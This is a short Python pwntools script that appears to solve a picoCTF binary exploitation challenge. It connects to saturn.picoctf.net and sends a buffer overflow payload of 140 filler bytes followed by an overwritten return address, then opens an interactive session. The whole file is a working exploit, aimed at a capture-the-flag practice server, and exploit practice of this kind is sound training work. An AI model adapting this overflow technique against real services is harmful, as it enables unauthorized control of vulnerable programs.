#!/usr/bin/env python3
from pwn import * 

r = remote("saturn.picoctf.net", 58426)

payload = b'A'*140 + p32(0x401530)
r.sendline(payload)
r.interactive()